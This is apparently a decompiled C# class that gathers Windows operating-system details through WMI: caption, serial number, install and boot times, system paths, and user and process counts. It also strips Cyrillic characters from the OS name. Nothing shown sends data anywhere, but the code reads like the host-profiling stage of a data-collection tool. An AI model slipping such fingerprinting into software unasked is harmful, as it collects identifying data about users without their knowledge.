using System;

namespace NoiseMe.Drags.App.Data.WMI
{
	// Token: 0x02000172 RID: 370
	public static class OsGatherer
	{
		// Token: 0x06000BEB RID: 3051 RVA: 0x00023E94 File Offset: 0x00022094
		private static string ClearEmpties(string input)
		{
			string[] value = input.Trim().Split(new char[]
			{
				' '
			}, StringSplitOptions.RemoveEmptyEntries);
			return string.Join(" ", value);
		}

		// Token: 0x06000BEC RID: 3052 RVA: 0x00023EC4 File Offset: 0x000220C4
		private static string ClearRussian(string input)
		{
			string text = string.Empty;
			foreach (char c in input)
			{
				if (!"йцукенгшщзхъфывапролджэячсмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ".Contains(c.ToString()))
				{
					text += c.ToString();
				}
			}
			return OsGatherer.ClearEmpties(text);
		}

		// Token: 0x06000BED RID: 3053 RVA: 0x0000937A File Offset: 0x0000757A
		public static string GetCaption()
		{
			return OsGatherer.ClearRussian(WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "Caption", null));
		}

		// Token: 0x06000BEE RID: 3054 RVA: 0x00009391 File Offset: 0x00007591
		public static string GetOSArchitecture()
		{
			if (!PlatformHelper.Is64Bit)
			{
				return "x32 Bit";
			}
			return "x64 Bit";
		}

		// Token: 0x06000BEF RID: 3055 RVA: 0x000093A5 File Offset: 0x000075A5
		public static string GetSerialNumber()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SerialNumber", null);
		}

		// Token: 0x06000BF0 RID: 3056 RVA: 0x000093B7 File Offset: 0x000075B7
		public static DateTime? GetInstallDate()
		{
			return WmiInstance.PropertyQuery<DateTime?>("Win32_OperatingSystem", "InstallDate", null);
		}

		// Token: 0x06000BF1 RID: 3057 RVA: 0x000093C9 File Offset: 0x000075C9
		public static DateTime? GetLastBootUpTime()
		{
			return WmiInstance.PropertyQuery<DateTime?>("Win32_OperatingSystem", "LastBootUpTime", null);
		}

		// Token: 0x06000BF2 RID: 3058 RVA: 0x000093DB File Offset: 0x000075DB
		public static DateTime? GetLocalDateTime()
		{
			return WmiInstance.PropertyQuery<DateTime?>("Win32_OperatingSystem", "LocalDateTime", null);
		}

		// Token: 0x06000BF3 RID: 3059 RVA: 0x000093ED File Offset: 0x000075ED
		public static string GetBootDevice()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "BootDevice", null);
		}

		// Token: 0x06000BF4 RID: 3060 RVA: 0x000093FF File Offset: 0x000075FF
		public static string GetSystemDevice()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SystemDevice", null);
		}

		// Token: 0x06000BF5 RID: 3061 RVA: 0x00009411 File Offset: 0x00007611
		public static string GetSystemDrive()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SystemDrive", null);
		}

		// Token: 0x06000BF6 RID: 3062 RVA: 0x00009423 File Offset: 0x00007623
		public static string GetSystemDirectory()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SystemDirectory", null);
		}

		// Token: 0x06000BF7 RID: 3063 RVA: 0x00009435 File Offset: 0x00007635
		public static string GetWindowsDirectory()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "WindowsDirectory", null);
		}

		// Token: 0x06000BF8 RID: 3064 RVA: 0x00009447 File Offset: 0x00007647
		public static uint? GetNumberOfUsers()
		{
			return WmiInstance.PropertyQuery<uint?>("Win32_OperatingSystem", "NumberOfUsers", null);
		}

		// Token: 0x06000BF9 RID: 3065 RVA: 0x00009459 File Offset: 0x00007659
		public static uint? GetNumberOfProcesses()
		{
			return WmiInstance.PropertyQuery<uint?>("Win32_OperatingSystem", "NumberOfProcesses", null);
		}
	}
}
